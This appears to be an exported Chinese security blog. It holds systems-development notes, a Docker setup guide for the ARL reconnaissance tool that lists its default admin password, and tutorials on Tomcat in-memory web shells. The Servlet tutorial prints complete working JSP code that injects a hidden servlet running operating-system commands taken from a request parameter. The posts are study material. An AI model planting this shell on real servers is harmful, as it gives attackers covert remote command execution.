<li><p>Waterfall</p>
<ul>
<li>generally all testing and quality control points late in the project </li>
</ul>
</li>
<li><p>Agile</p>
<ul>
<li>Testing is integrated throughout the lifecycle; testing the software continuously throughout  its development</li>
<li>NO a separate test phase </li>
<li>Developers write automated repeatable unit tests to validate their code</li>
<li>Supports the principle of small, iterative, incremental releases.</li>
<li>Testing is done as part of the build. Ensure that all features are working correctly each time the build is produced.</li>
<li>integration is done as you go</li>
<li>the purpose of these principles is to keep the software in releasable condition thought the development, so it can be shipped whenever it’s appropriate.</li>
</ul>
</li>
</ul>
</li>
<li><p>Testing methods</p>
<ul>
<li><p>Black Box Testing</p>
<ul>
<li>without reference to the internal structure of the component and system </li>
</ul>
</li>
<li><p>White Box Testing</p>
<ul>
<li>uses an internal perspective of the system to design test cases based on internal structure </li>
</ul>
</li>
<li><p>Grey Box Testing</p>
<ul>
<li>increase testing coverage</li>
</ul>
</li>
</ul>
</li>
<li><p>Testing type</p>
<ul>
<li>functional testing</li>
<li>regression testing</li>
<li>static &amp; dynamic testing</li>
<li>performance &amp; load &amp; stress testing - usability testing</li>
<li>accessibility testing</li>
<li>security testing</li>
<li>Backup&amp;Recovery testing</li>
</ul>
</li>
</ul>
<h2 id="S11-Implementation-amp-Maintainance"><a href="#S11-Implementation-amp-Maintainance" class="headerlink" title="S11. Implementation &amp; Maintainance"></a>S11. Implementation &amp; Maintainance</h2><h3 id="Implementation-phase-activities"><a href="#Implementation-phase-activities" class="headerlink" title="Implementation phase activities"></a>Implementation phase activities</h3><ul>
<li><p>implementation Planning</p>
<ul>
<li>review acceptance Checklist, Prepare Implementation Schedule </li>
</ul>
</li>
<li><p>Build the system or buy the system</p>
<ul>
<li>will result in a varied implementation path</li>
</ul>
</li>
<li><p>test the system</p>
<ul>
<li>System Testing(functional and performance) Acceptance Testing</li>
</ul>
</li>
<li><p>finalise documentation</p>
<ul>
<li>system documentation</li>
<li>user documentation</li>
</ul>
</li>
<li><p>get ready for the system to go into Production</p>
<ul>
<li>data conversion</li>
<li>configure the production environment</li>
<li>conduct trainning</li>
</ul>
</li>
<li><p>Deploy the system</p>
<ul>
<li>install/deploy the system, Monitor Operations, benchmark Testing, tune the system</li>
</ul>
</li>
<li><p>wrapup</p>
<ul>
<li>Opperation handover</li>
<li>transition support </li>
<li>system closure</li>
<li>post-implementation review</li>
</ul>
</li>
</ul>
<h3 id="data-conversion"><a href="#data-conversion" class="headerlink" title="data conversion"></a>data conversion</h3><ul>
<li>Original</li>
<li>consolidation</li>
<li>Cleansing</li>
<li>Update</li>
<li>Final Load</li>
</ul>
<h3 id="trainning"><a href="#trainning" class="headerlink" title="trainning"></a>trainning</h3><ul>
<li><p>consideration</p>
<ul>
<li>users, number of users</li>
<li>existing skills level - on-going level</li>
<li>who conduct the meeting</li>
<li>when/where training should be conducted</li>
<li>training documentation</li>
<li>need supported User Manager who committed allocating time for training</li>
</ul>
</li>
</ul>
<h3 id="deployment"><a href="#deployment" class="headerlink" title="deployment"></a>deployment</h3><ul>
<li><p>Direct deployment</p>
<ul>
<li><p>install a new system</p>
</li>
<li><p>This approach is meaningful when:</p>
<ul>
<li><p>the system is not replacing any other system</p>
</li>
<li><p>– the old system is judged absolutely without value</p>
</li>
<li><p>– the new system is completely different from the old and comparisons would be meaningless</p>
</li>
<li><p>– the old system is either very small and/or very simple</p>
</li>
</ul>
</li>
<li><p>advantage</p>
<ul>
<li>Simple, fewer logistic issues to manage, costs minimised</li>
</ul>
</li>
</ul>
</li>
<li><p>Parallel deployment</p>
<ul>
<li><p>old and new systems both operate for an extended period of time</p>
</li>
<li><p>advantage</p>
<ul>
<li>Risk low if problems occurs – continual backup</li>
</ul>
</li>
<li><p>disadvantage</p>
<ul>
<li>High cost: increased personnel, extra space, increased managerial and logistic complexity</li>
</ul>
</li>
</ul>
</li>
<li><p>Pilot deployment(multiple locations)</p>
<ul>
<li><p>old and new systems operated concurrectly</p>
</li>
<li><p>only part of organisation tries out the new system</p>
</li>
<li><p>The pilot system must prove itself at the test site</p>
</li>
<li><p>advantage</p>
<ul>
<li>Risks relatively low if problems occur</li>
<li>Errors are localised to pilot site</li>
<li>Can be used to train users before implementation at their own site</li>
</ul>
</li>
<li><p>disadvantage</p>
<ul>
<li>Lack of consistency between different parts of the organisation</li>
</ul>
</li>
</ul>
</li>
<li><p>Phased deployment(multiple functions)</p>
<ul>
<li><p>A New system installed in series of steps or phase, where each phase adds components to the existing system</p>
</li>
<li><p>advantage</p>
<ul>
<li>Reduces risk because phase failure is less serious than system failure</li>
<li>Lower costs for earlier results</li>
<li>Benefits can be realised earlier</li>
<li>Rate of change minimised for users</li>
</ul>
</li>
<li><p>Disadvantage</p>
<ul>
<li>Multiple phases cause more activities, milestones, and management complexity for entire effort</li>
<li>Close control of systems development is essential</li>
<li>Costs associated with the development of temporary interfaces to old systems</li>
<li>Limited business applicability</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Maintenance-closure"><a href="#Maintenance-closure" class="headerlink" title="Maintenance/closure"></a>Maintenance/closure</h3><ul>
<li><p>Corrective maintenance</p>
<ul>
<li>corrects analysis, design, and implementation errors</li>
<li>focus on moving defects</li>
</ul>
</li>
<li><p>Adaptive maintenance</p>
<ul>
<li>to satisfy changes in the new environment, changing business needs or new user requirements</li>
</ul>
</li>
<li><p>Perfective maintenance</p>
<ul>
<li>to enhance performance, maintainability, usability</li>
<li>To meet user requirements not previously recognised or given high<br>priority</li>
</ul>
</li>
<li><p>Preventative maintenance</p>
<ul>
<li>identify and fix any<br>potential problems noted while fixing other errors</li>
</ul>
</li>
</ul>
<h3 id="Change-Management-system"><a href="#Change-Management-system" class="headerlink" title="Change Management system"></a>Change Management system</h3><ul>
<li>manage change effectively </li>
<li>reduce the confusion and complexity of<br>developing and maintaining systems</li>
</ul>
<h3 id="why-post-implementation-review-important"><a href="#why-post-implementation-review-important" class="headerlink" title="why post implementation review important"></a>why post implementation review important</h3><ul>
<li>post implementation analyses what went wrong and right with a project </li>
<li>compare costs of development and operation against original estimates</li>
<li>look at original requirements and evaluate how well they were met</li>
<li>compare original and actual benefits</li>
<li>new system reviewed to see whether more of original or additional benefits can be realised</li>
</ul>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Systems Development</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全之ARL灯塔搭建</title>
    <url>/2021/06/01/arlSetup/</url>
    <content><![CDATA[<h1 id="How-do-you-set-up-ARL"><a href="#How-do-you-set-up-ARL" class="headerlink" title="How do you set up ARL?"></a>How do you set up ARL?</h1><p>详细参考：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
<h2 id="Preparation-服务器购买"><a href="#Preparation-服务器购买" class="headerlink" title="Preparation: 服务器购买"></a>Preparation: 服务器购买</h2><p>因为ARL是搭建在LINUX系统上，我的MAC内存又不够，加上想要ARL全天24小时运作，所以决定搭建在远程服务器上。</p>
<p>这里我选择了<a href="https://console.cloud.tencent.com/">腾讯云</a>, 系统为Ubuntu 64</p>
<p>选择生成ssh私钥，并绑定到主机上，登录时用生成的密码文件登陆即可</p>
<p><a href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p>
<span id="more"></span>

<h2 id="Install-Docker-on-Ubuntu"><a href="#Install-Docker-on-Ubuntu" class="headerlink" title="Install Docker on Ubuntu"></a>Install Docker on Ubuntu</h2><p>第一步：如果有安装过Docker旧版本，需要先卸载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>

<p>第二步：设置docker仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更新 apt package index</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载 package</span></span><br><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加docker的官方gpg key</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立稳定的仓库</span></span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>

<p>第三步：安装Docker引擎</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<p>最后测试docker环境是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<p><img src="/image/arlSetup/image-20210601225207466.png" alt="image-20210601225207466"></p>
<h2 id="Install-Docker-Compose"><a href="#Install-Docker-Compose" class="headerlink" title="Install Docker Compose"></a>Install Docker Compose</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先在https://github.com/docker/compose/releases 查看最新版本，当前版本为1.29.2</span></span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.29.2/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` -o /usr/local/bin/docker-compose</span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment">#最后查看是否安装成功</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<p><img src="/image/arlSetup/image-20210602132156940.png" alt="image-20210602132156940"></p>
<h2 id="Install-ARL"><a href="#Install-ARL" class="headerlink" title="Install ARL"></a>Install ARL</h2><p>手动下载ARL最新版本：<a href="https://github.com/TophantTechnology/ARL/releases">https://github.com/TophantTechnology/ARL/releases</a></p>
<p><img src="/image/arlSetup/image-20210602132458529.png" alt="image-20210602132458529"></p>
<p>将下载好的压缩包在本地解压，文件名为docker_arl</p>
<p><img src="/image/arlSetup/image-20210602133905785.png" alt="image-20210602133905785"></p>
<p>然后用sftp传送文件到服务器上，这里我用的是==mac版的FileZilla== </p>
<p><img src="/image/arlSetup/image-20210602134851037.png" alt="image-20210602134851037"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建容器数据卷 </span></span><br><span class="line">sudo docker volume create --name=arl_db *</span><br><span class="line"><span class="comment"># 进入上传的目录</span></span><br><span class="line"><span class="built_in">cd</span> /home/docker_arl </span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/image/arlSetup/image-20210602140011363.png" alt="image-20210602140011363"></p>
<p><strong>补充：在使用docker和docker-compose的时候，必须要root权限，所以前面需要加上sudo，若想直接用root用户登陆 可参考 <a href="https://cloud.tencent.com/developer/article/1405735">腾讯云ubuntu系统改为root登录</a></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#看docker-compose是否运行正常</span></span><br><span class="line">sudo docker-compose ps</span><br></pre></td></tr></table></figure>

<p><img src="/image/arlSetup/image-20210602140410197.png" alt="image-20210602140410197"></p>
<h2 id="登录搭建好的ARL灯塔系统"><a href="#登录搭建好的ARL灯塔系统" class="headerlink" title="登录搭建好的ARL灯塔系统"></a>登录搭建好的ARL灯塔系统</h2><p>https://你的服务器外网ip:5003/</p>
<p>这里我用Chrome访问，但是会提示连接不是private的<img src="/image/arlSetup/image-20210602142031252.png" alt="image-20210602142031252"></p>
<p>于是我换了safari，依然提示连接不是private，但可以继续访问</p>
<p><img src="/image/arlSetup/image-20210602142133895.png" alt="image-20210602142133895"></p>
<p><code>默认账号:admin 密码:arlpass</code></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Information Gathering</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Information Gathering</tag>
        <tag>ARL</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马系列(三):Servlet型</title>
    <url>/2021/12/30/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%89-Servlet%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在掌握了Listener内存马的实现后，Servlet型内存马的实现也变得很简单。此篇笔记主要讲解了构造Servlet型内存马的流程。</p>
<span id="more"></span>

<h1 id="探究Servlet的创建流程"><a href="#探究Servlet的创建流程" class="headerlink" title="探究Servlet的创建流程"></a>探究Servlet的创建流程</h1><p>同样是创建一个HomeServlet，并将Class的开头与doGet()的地方打上断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134250716.png" alt="image-20211230134250716"></p>
<p>同时在web.xml中添加上</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/home<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行服务器后发现 第一个断点会在访问<code>/home</code>后断下，因此我们断点，servlet是在server收到请求后创建的。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134515772.png" alt="image-20211230134515772"></p>
<p>在<code>StandardWrapper</code>中，loadServlet()方法中创建了一个servlet</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134614746.png" alt="image-20211230134614746"></p>
<p>那么如果我们将<code>this.servletClass</code>改成恶意Servlet，那么恶意Servlet就会被创建。</p>
<h1 id="构造Servlet内存马的创建代码"><a href="#构造Servlet内存马的创建代码" class="headerlink" title="构造Servlet内存马的创建代码"></a>构造Servlet内存马的创建代码</h1><p>现在已经知道要修改StandardWrapper中的servletClass，但要想修改，就得先获取到StandardWrapper对象。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134947343.png" alt="image-20211230134947343"></p>
<p><code>StandardWrapper</code>继承了<code>ServletConfig</code>，而<code>ServletConfig</code>是可以直接被我们所获取得，其保存了当前Servlet的配置信息。</p>
<p>因此我们可以直接在jsp中进行获取。</p>
<p>需要注意的是，jsp中获取到的作用域都是<code>Facade</code>类型(如果直接写成StandardWrapperFacade类型会报错)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135326053.png" alt="image-20211230135326053"></p>
<p>可以发现在构造方法中，StandardWrapper类型的context被赋值给了类属性<code>context</code></p>
<p>因此我们可以用反射的方法来获取到context</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取到standardWrapper后，就可以设置相应的servlet了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135525495.png" alt="image-20211230135525495"></p>
<p>因此完整的注册内存马代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  <span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">  stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line">  stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h1 id="构造Servlet内存马恶意代码的构造"><a href="#构造Servlet内存马恶意代码的构造" class="headerlink" title="构造Servlet内存马恶意代码的构造"></a>构造Servlet内存马恶意代码的构造</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.http.HttpServlet&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytes=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> ((i=inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">      resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">      resp.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapperFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: leihehe</span><br><span class="line">  Date: <span class="number">30</span>/<span class="number">12</span>/<span class="number">2021</span></span><br><span class="line">  Time: 09:<span class="number">22</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.http.HttpServlet&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">      <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">      <span class="type">byte</span>[] bytes=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">      <span class="keyword">while</span> ((i=inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">  stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line">  stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230140132389.png" alt="image-20211230140132389"></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Memory Shell</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Memory Shell</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马系列(一):Filter型</title>
    <url>/2021/12/07/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%80-Filter%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着这些年来各种安全防护手段的出现，想要上传一个文件类型的<strong>webshell</strong>从而拿到权限更难上加难。但最近横空出世的内存马因为隐蔽性高，逐渐被大众所知。</p>
<p>内存马目前分为三大类：</p>
<p><strong>servlet-api类</strong></p>
<ul>
<li>Filter型</li>
<li>Servlet型</li>
<li>Listener型</li>
</ul>
<p><strong>spring类</strong></p>
<ul>
<li>拦截器</li>
<li>Controller型</li>
</ul>
<p><strong>Java Instrumentation类</strong></p>
<ul>
<li>Agent型</li>
</ul>
<p>此文将以servlet-api类的Filter类内存马开篇，详细讲解其原理、利用与检测。</p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>新建一个JAVA项目</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145004004.png" alt="image-20211208145004004"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145023106.png" alt="image-20211208145023106"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145039178.png" alt="image-20211208145039178"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145106202.png" alt="image-20211208145106202"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145146347.png" alt="image-20211208145146347"></p>
<p>接下来就是哪里有IDEA提示就选哪里，比如下面这样的，我们直接按他的提示选fix</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145216611.png" alt="image-20211208145216611"></p>
<p>接下来在Project Structure里面把Tomcat的包引进来</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145431939.png" alt="image-20211208145431939"></p>
<p>为了方便我全部引进来了</p>
<p>接下来在src文件夹里创建一个<strong>TestServlet</strong> Class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再创建一个<strong>TestFilter</strong> Class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是初始化信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">//执行过滤操作</span></span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WEB-INF/web.xml配置：需要配置Filter一些信息 - <strong>这个配置非常重要，理解它有助于我们的分析</strong></p>
